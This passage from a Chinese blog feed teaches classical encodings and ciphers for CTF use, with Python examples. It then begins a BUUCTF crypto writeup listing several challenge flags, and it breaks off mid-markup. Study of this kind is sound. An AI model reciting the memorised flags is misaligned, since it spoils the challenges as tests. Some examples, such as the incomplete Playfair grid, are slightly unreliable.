align="center"></td></tr><tr><td align="center">8</td><td align="center">I</td><td></td><td align="center">17</td><td align="center">R</td><td></td><td align="center">26</td><td align="center">2</td><td></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>可以看如下表格</p><table><thead><tr><th align="center">文本</th><th align="center">K</th><th align="center">e</th><th align="center">n</th><th align="center">NULL</th><th align="center">NULL</th></tr></thead><tbody><tr><td align="center">ASCII编码</td><td align="center">75</td><td align="center">101</td><td align="center">110</td><td align="center">NULL</td><td align="center">NULL</td></tr><tr><td align="center">二进制位</td><td align="center">01001011</td><td align="center">01100101</td><td align="center">01101110</td><td align="center">NULL</td><td align="center">NULL</td></tr><tr><td align="center">分组</td><td align="center">01001</td><td align="center">01101</td><td align="center">10010</td><td align="center">10110</td><td align="center">11100</td></tr><tr><td align="center">分组后的十进制</td><td align="center">9</td><td align="center">13</td><td align="center">18</td><td align="center">22</td><td align="center">28</td></tr><tr><td align="center">索引值</td><td align="center">J</td><td align="center">N</td><td align="center">S</td><td align="center">W</td><td align="center">4</td></tr></tbody></table><hr><h2 id="三-base16加密"><a href="#三-base16加密" class="headerlink" title="三.base16加密"></a>三.base16加密</h2><p>如果理解了，base64加密和base32加密方式，那么base16加密方式就很好理解了，先看如下base16索引表。</p><table><thead><tr><th align="center">数值</th><th align="center">字符</th><th></th><th align="center">数值</th><th align="center">字符</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">0</td><td></td><td align="center">8</td><td align="center">8</td></tr><tr><td align="center">1</td><td align="center">1</td><td></td><td align="center">9</td><td align="center">9</td></tr><tr><td align="center">2</td><td align="center">2</td><td></td><td align="center">10</td><td align="center">A</td></tr><tr><td align="center">3</td><td align="center">3</td><td></td><td align="center">11</td><td align="center">B</td></tr><tr><td align="center">4</td><td align="center">4</td><td></td><td align="center">12</td><td align="center">C</td></tr><tr><td align="center">5</td><td align="center">5</td><td></td><td align="center">13</td><td align="center">D</td></tr><tr><td align="center">6</td><td align="center">6</td><td></td><td align="center">14</td><td align="center">E</td></tr><tr><td align="center">7</td><td align="center">7</td><td></td><td align="center">15</td><td align="center">F</td></tr></tbody></table><p>先还是和base64和base32一样将需要加密的字符串转换成ASCII码然后转换成二进制，区别就是分组排序的时候是以4个为一组来排序，base64是六个为一组，base32是以五个为一组，如下图理解即可，图来自CSDN。</p><p><img src="/images/wordimage/20220201/base16.png"></p><hr><h2 id="四-Unicode编码"><a href="#四-Unicode编码" class="headerlink" title="四.Unicode编码"></a>四.Unicode编码</h2><p>特征是以<code>\u数字或者字母加数字</code>，比如，\u6211，转换中文就是“我”，<code>\u</code>过后是每四个为一组，最简单解码方式可以使用python的print函数输出即可，编码👉<strong>\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064</strong>，解码效果如下图👇，成功解码出字符串<code>Hello World</code></p><p><img src="/images/wordimage/20220201/unicode.png"></p><p>上面是解密，加密如下。</p><p>编码原理，先将需要加密的字符转换成ASCII编码，然后把ASCII编码转换成十六进制即可，不足四位前面添0即可，比如<code>a</code>这个字符，编码之后是0x61，就需要加零就是0x0061，如下是python实现，非常简单。</p><p>最重要的就是ord函数和hex函数，ord函数把字符转ASCII，然后hex把数字转十六进制。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">'flag'</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">r'0x'</span><span class="token punctuation">,</span><span class="token string">r'\u'</span><span class="token punctuation">)</span>    <span class="token builtin">dict</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="五-URL编码"><a href="#五-URL编码" class="headerlink" title="五.URL编码"></a>五.URL编码</h2><p>在浏览器地址栏经常能看见，特征是<code>%数字加字母</code>，比如👉<strong>%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C</strong>，这种类型的，解码之后的原文是，<strong>你好世界</strong>，还是需要用到python,当然也可以在线编码解码，需要用到的是python的<code>urllib</code>模块下面的<code>parse</code>模块，如下代码。</p><p>quote是编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">as</span> url<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'你好世界'</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输入效果如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如何解码，如下python代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">as</span> url<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'%E4%BD%A0%E5%A5%BD%E4%B8%96%E7%95%8C'</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>解码效果为<code>你好世界</code></p><hr><h2 id="六-进制转换"><a href="#六-进制转换" class="headerlink" title="六.进制转换"></a>六.进制转换</h2><h3 id="1-python实现进制转换"><a href="#1-python实现进制转换" class="headerlink" title="1.python实现进制转换"></a>1.python实现进制转换</h3><hr><h4 id="1-十进制转二进制"><a href="#1-十进制转二进制" class="headerlink" title="1.十进制转二进制"></a>1.十进制转二进制</h4><p>可以用到一个函数bin函数，可以之间转换，如下代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果是<code>0b1010</code></p><hr><h4 id="2-二进制转十进制"><a href="#2-二进制转十进制" class="headerlink" title="2.二进制转十进制"></a>2.二进制转十进制</h4><p>可以用到一个int函数，如下代码，int函数里面的2代表的是进制。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'1010'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出的数字是<code>10</code>。</p><hr><h4 id="3-十进制转八进制"><a href="#3-十进制转八进制" class="headerlink" title="3.十进制转八进制"></a>3.十进制转八进制</h4><p>需要用到一个oct函数，如下代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">oct</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入结果是<code>0o144</code></p><hr><h4 id="4-八进制转十进制"><a href="#4-八进制转十进制" class="headerlink" title="4.八进制转十进制"></a>4.八进制转十进制</h4><p>和上面二进制转十进制差不多，如下代码，只需要更改数字即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'144'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h4 id="5-十进制转十六进制"><a href="#5-十进制转十六进制" class="headerlink" title="5.十进制转十六进制"></a>5.十进制转十六进制</h4><p>需要用到一个hex函数，如下代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果是<code>0xff</code>，十六进制转换十进制和上面差不多，只需要更改数字即可。</p><hr><h3 id="2-手算进制"><a href="#2-手算进制" class="headerlink" title="2.手算进制"></a>2.手算进制</h3><p>可以直接参考百度百科👉<a href="https://baike.baidu.com/item/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/3117222">进制转换</a>。</p><hr><h2 id="七-置换密码"><a href="#七-置换密码" class="headerlink" title="七.置换密码"></a>七.置换密码</h2><h3 id="1-加密"><a href="#1-加密" class="headerlink" title="1.加密"></a>1.加密</h3><p>1.明文:<code>State Key Laboratory of Networking and Switching</code></p><p>2.加密密钥:<code>key=(1,5,6,2,3)</code></p><p>3.将明文分组，按照六个字母一组来分，总共可以分为七组，不足六个字母的可以用双方事先规定好的字符来填充比如空格，如下是分组过后的样子👇。</p><p><strong>P = (StateK)(eyLabo)(ratory)(ofNetw)(orking)(andSwi)(tching)</strong></p><p>4.对每组字符进行加密，根据加密密钥key，把每组的第1位字符放在第5位字符上面，第5位字符放在第6位字符上面，第6位字符放在第2位字符上面，第2位字符放在第3位字符上面，第3位字符放在第1位字符上面，这样排序即可，如下👇。</p><p><strong>P = (aKttSe)(Loyaeb)(tyaorr)(Nwfeot)(kgrion)(dinSaw)(hgcitn)</strong></p><p>最终密文就是<code>aKttSeLoyaebtyaorrNwfeotkgriondinSawhgcitn</code></p><hr><h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2.解密"></a>2.解密</h3><p>解密需要的是把密钥给反向过来，原本的密钥是<code>(1,5,6,2,3)</code>需要逆置换变成<code>(1,3,2,6,5)</code>，然后在按照加密的方法即可解密。</p><hr><h2 id="八-栅栏密码"><a href="#八-栅栏密码" class="headerlink" title="八.栅栏密码"></a>八.栅栏密码</h2><p>栅栏密码潜规则，字符不会超过30个。</p><hr><h3 id="1-加密-1"><a href="#1-加密-1" class="headerlink" title="1.加密"></a>1.加密</h3><p>假设明文是:<code>THEREISACIPHER</code>，然后根据上下上下排序，就是</p><p>T E E S C P E<br>H R I A   I H  R</p><p>最后连在一起就是TEESCPEHRIAIHR。</p><p>加密的另外一种方法，明文是<code>THEREISACIPHER</code>，先两个两个分一组，就是，<code>TH ER EI SA CI PH ER</code>。</p><p>先取出第一个字母：TEESCPE<br>在取出第二个字母：HRIAIHR</p><p>最后连在一起即可。</p><hr><h3 id="2-解密-1"><a href="#2-解密-1" class="headerlink" title="2.解密"></a>2.解密</h3><p>加密密文：<code>TEESCPEHRIAIHR</code></p><p>解密只需要将密文从中间分开，变位两行。</p><p><code>T E E S C P E</code><br><code>H R I A I H R</code></p><p>最后在上下上下组合起来即可。</p><p><code>THEREISACIPHER</code></p><hr><h2 id="九-单表代换密码"><a href="#九-单表代换密码" class="headerlink" title="九.单表代换密码"></a>九.单表代换密码</h2><p>假设明文是:<code>helloWorld</code></p><p>假设密钥是:<code>KENSSB</code>，去掉重复的字母就是<code>KENSB</code>，然后按照字母顺序排列剩余的字母即可得到一个方阵表，如下表。</p><table><thead><tr><th align="center">K</th><th align="center">E</th><th align="center">N</th><th align="center">S</th><th align="center">B</th></tr></thead><tbody><tr><td align="center">A</td><td align="center">C</td><td align="center">D</td><td align="center">F</td><td align="center">G</td></tr><tr><td align="center">H</td><td align="center">I</td><td align="center">J</td><td align="center">L</td><td align="center">M</td></tr><tr><td align="center">O</td><td align="center">P</td><td align="center">Q</td><td align="center">R</td><td align="center">T</td></tr><tr><td align="center">U</td><td align="center">V</td><td align="center">W</td><td align="center">X</td><td align="center">Y</td></tr><tr><td align="center">Z</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><p>然后在从左边下边开始一直到右边排序，即可得到代换密文，代换密码表如下表所示。</p><table><thead><tr><th>明文字母</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td>密文字母</td><td>K</td><td>A</td><td>H</td><td>O</td><td>U</td><td>Z</td><td>E</td><td>C</td><td>I</td><td>P</td><td>V</td><td>N</td><td>D</td><td>J</td><td>Q</td><td>W</td><td>S</td><td>F</td><td>L</td><td>R</td><td>X</td><td>B</td><td>G</td><td>M</td><td>T</td><td>Y</td></tr></tbody></table><p>然后按照，明文字母所对应的密文字母，找到排序即可，<code>helloword</code>加密之后的密文是<code>CUNNQGQFNO</code></p><hr><h2 id="十-埃特巴什码"><a href="#十-埃特巴什码" class="headerlink" title="十.埃特巴什码"></a>十.埃特巴什码</h2><p>最后一个字母代表的十第一个字母，倒数第二个字母代表的十第二个字母，如下表所示。</p><table><thead><tr><th>明文字母</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td>密文字母</td><td>Z</td><td>Y</td><td>X</td><td>W</td><td>V</td><td>U</td><td>T</td><td>S</td><td>R</td><td>Q</td><td>P</td><td>O</td><td>N</td><td>M</td><td>L</td><td>K</td><td>J</td><td>I</td><td>H</td><td>G</td><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td></tr></tbody></table><hr><h2 id="十一-凯撒密码"><a href="#十一-凯撒密码" class="headerlink" title="十一.凯撒密码"></a>十一.凯撒密码</h2><p>根据如下表排序，如下表是最基础的凯撒密码，就是往右移位，A对应的B，B对应的是C，比如明文是KEN，那么按照下表密文对应的就是LFO。</p><table><thead><tr><th>明文字母</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td>密文字母</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>G</td><td>H</td><td>I</td><td>J</td><td>K</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td><td>A</td></tr></tbody></table><p>python代码如下，1代表的是移位。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">caser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token string">'HelloWorld'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    dict_txt <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    dec <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>        dec<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dict_txt<span class="token punctuation">[</span>dict_txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    caser<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="十二-仿射密码"><a href="#十二-仿射密码" class="headerlink" title="十二.仿射密码"></a>十二.仿射密码</h2><p>原理是，先将26个字母按照0-25排序也就是(0,1,2,3…25)，密钥为k(a,b)，加密公式为<code>c=Ea,b(m)≡am+b(mod26)</code>，解密公式为<code>m=Da,b(c)≡a-1(c-b)(mod26)</code>。</p><p>如下表是字母索引表</p><table><thead><tr><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th><th>Z</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td><td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td><td>23</td><td>24</td><td>25</td></tr></tbody></table><h3 id="1-加密-2"><a href="#1-加密-2" class="headerlink" title="1.加密"></a>1.加密</h3><p>例如我这里要加密helloworld加密过程并且密钥是k(7,21)：</p><p>h=7，7*7+21(mod26)=18，h=s</p><p>e=4，7*4+21(mod26)=23，e=x</p><p>l=11，7*11+21(mod26)=20，l=u</p><p>l=11，7*11+21(mod26)=20，l=u</p><p>o=14，7*14+21(mod26)=15，o=p</p><p>w=22，7*22+21(mod26)=19，w=t</p><p>o=14，7*14+21(mod26)=15，o=p</p><p>r=17，7*17+21(mod26)=10，r=k</p><p>l=11，7*11+21(mod26)=20，l=u</p><p>d=3，7*3+21(mod26)=16，d=q</p><p>所以helloworld加密之后的成果是<code>sxuuptpkuq</code>。</p><hr><h3 id="2-解密-2"><a href="#2-解密-2" class="headerlink" title="2.解密"></a>2.解密</h3><p>知道解密公式是<code>m=Da,b(c)≡a-1(c-b)(mod26)&amp;m=D7,21(c)≡7-1(c-21)(mod26)     </code>，密文是<code>sxuuptpkuq</code>，解密过程如下。</p><p>s=18，7^-1*(18-21)(mod26)</p><p>x=23，7^-1*(23-21)(mod26)</p><p>省略。。。。</p><hr><h3 id="3-python代码"><a href="#3-python代码" class="headerlink" title="3.python代码"></a>3.python代码</h3><p>如下是加密代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">affine_cipher_en</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要加密的明文:'</span><span class="token punctuation">)</span>    k_a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入密钥中的第一个值a："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    k_b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入密钥中的第一个值b:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_en <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span>        flag_en<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k_a <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">97</span><span class="token punctuation">)</span> <span class="token operator">+</span> k_b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag_en<span class="token punctuation">)</span><span class="token punctuation">)</span>affine_cipher_en<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下是python解密代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#解密脚本</span><span class="token keyword">def</span> <span class="token function">affine_cipher_de</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要解密的明文:'</span><span class="token punctuation">)</span>    k_a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入密钥中的第一个值a："</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    k_b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入密钥中的第一个值b:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_list <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag_de <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span>        flag_de<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">15</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span> <span class="token operator">-</span> k_b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag_de<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="十三-棋盘密码"><a href="#十三-棋盘密码" class="headerlink" title="十三.棋盘密码"></a>十三.棋盘密码</h2><p>棋盘密码就是将26个字母放在5x5的方格子里面，ij放在一个格子里面，具体如下表👇。</p><table><thead><tr><th align="center"></th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">a</td><td align="center">b</td><td align="center">c</td><td align="center">d</td><td align="center">e</td></tr><tr><td align="center">2</td><td align="center">f</td><td align="center">g</td><td align="center">h</td><td align="center">i/j</td><td align="center">k</td></tr><tr><td align="center">3</td><td align="center">l</td><td align="center">m</td><td align="center">n</td><td align="center">o</td><td align="center">p</td></tr><tr><td align="center">4</td><td align="center">q</td><td align="center">r</td><td align="center">s</td><td align="center">t</td><td align="center">u</td></tr><tr><td align="center">5</td><td align="center">v</td><td align="center">w</td><td align="center">x</td><td align="center">y</td><td align="center">z</td></tr></tbody></table><p>其中特点就是每两个数字编做一组，所有的数字都在1-5之间浮动，并且是先列后行的顺序排序。</p><p>比如<code>25 15 33</code>，所对应的就是<code>Ken</code></p><hr><h2 id="十四-普莱费尔密码"><a href="#十四-普莱费尔密码" class="headerlink" title="十四.普莱费尔密码"></a>十四.普莱费尔密码</h2><p>假设密钥是<code>kensb</code>，那么排序之后如下表，前面和单表代换一样，假设明文是<code>stegab</code></p><table><thead><tr><th>k</th><th>e</th><th>n</th><th>s</th><th>b</th></tr></thead><tbody><tr><td>A</td><td>C</td><td>D</td><td>F</td><td>G</td></tr><tr><td>H</td><td>I/J</td><td>L</td><td>M</td><td>O</td></tr><tr><td>P</td><td>Q</td><td>R</td><td>T</td><td>U</td></tr><tr><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table><p>加密原理就是如果假设需要加密明文里面的s对应的是p1,t对应的是p2，</p><p>1.那么p1，p2在同一行则对应的密文就是紧靠p1，p2右端的字母。</p><p>2.如果p1，p2在同一列则对应的密文分别是仅靠p1，p2下端的字母。</p><p>3.如果p1，p2不在同一列也不再同一行，那么对应的密文应该是p1，p2为对角顶点确定的矩阵的另外的两个顶点字母，按照同行原则对应。</p><p>加密效果如下表。</p><table><thead><tr><th>st</th><th>eg</th><th>ab</th></tr></thead><tbody><tr><td>FY</td><td>BC</td><td>GK</td></tr></tbody></table><p>解密就是加密过程。</p><p>第二篇链接👉<a href="https://blog.takagisan.top/2022/02dd678d5e.html">CTF常见密码学(二)</a>。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Crypto第一页(Md5-信息化时代步伐)解题思路</title>
      <link href="/2022/01812cc16c.html"/>
      <url>/2022/01812cc16c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CTF比赛！！</p><h2 id="一-MD5"><a href="#一-MD5" class="headerlink" title="一.MD5"></a>一.MD5</h2><p>题目就是提示</p><p>下载附件，打开文件，是md5，解密网址👉,<a href="https://cmd5.com/">在线md5解密</a>，解密即可。</p><p>flag:<code>flag&#123;admin1&#125;</code></p><hr><h2 id="二-一眼就解密"><a href="#二-一眼就解密" class="headerlink" title="二.一眼就解密"></a>二.一眼就解密</h2><p>没有附件，提示如下</p><blockquote><p> 下面的字符串解密后便能获得flag：ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30= 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>发现是base64编码，解密网址👉<a href="https://base64.us/">在线base64解密</a>，解密即可。</p><p>flag:<code>flag&#123;THE_FLAG_OF_THIS_STRING&#125;</code></p><hr><h2 id="三-url编码"><a href="#三-url编码" class="headerlink" title="三.url编码"></a>三.url编码</h2><p>题目就是提示</p><p>下载附件，发现是url编码，在线解密网址👉<a href="http://www.9tool.cn/Encryption/URL">url在线解密</a>，解密即可。</p><p>flag:<code>flag&#123;and 1=1&#125;</code></p><hr><h2 id="四-看我回旋踢"><a href="#四-看我回旋踢" class="headerlink" title="四.看我回旋踢"></a>四.看我回旋踢</h2><p>没有提示</p><p>下载附件，内容👉<code>synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</code>，看样子有点像凯撒和栅栏，每个都去试试，最后尝试是凯撒，凯撒移动13位，在线解密网址，<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">在线凯撒解密</a>，即可</p><p>flag:<code>flag&#123;5cd1004d-86a5-46d8-b720-beb5ba0417e1&#125;</code></p><hr><h2 id="五-摩丝"><a href="#五-摩丝" class="headerlink" title="五.摩丝"></a>五.摩丝</h2><p>题目就是提示</p><p>打开txt文本，内容如下👉<code>.. .-.. --- ...- . -.-- --- ..-</code>，摩斯密码在线解密即可，<a href="https://www.matools.com/morse">在线摩斯密码加密解密</a>，解密结果是<code>ILOVEYOU</code>。</p><p>flag:<code>flag&#123;ILOVEYOU&#125;</code></p><hr><h2 id="六-password"><a href="#六-password" class="headerlink" title="六.password"></a>六.password</h2><p>没有提示</p><p>下载附件，发现里面是姓名和生日，想了想一般人密码不就是自己的名字缩写加上生日吗，或者是生日加上名字缩写，尝试后发现是名字缩写加上生日。</p><p>flag:<code>flag&#123;zs19900315&#125;</code></p><hr><h2 id="七-变异凯撒"><a href="#七-变异凯撒" class="headerlink" title="七.变异凯撒"></a>七.变异凯撒</h2><p>提示就是变异凯撒。</p><p>下载附件，密文是<code>afZ_r9VYfScOeO_UL^RWUc</code>，是用的是ASCII变异，<code>afz_</code>对应的ASCII编码是<code>97 102 90 95</code> 而flag这个字眼对应的是<code>102 108 97 103</code>，就会发现:<code>97+5=102 102+6=108 90+7=97 95+8=103</code>，由此，python代码如下(借鉴的)。</p><pre 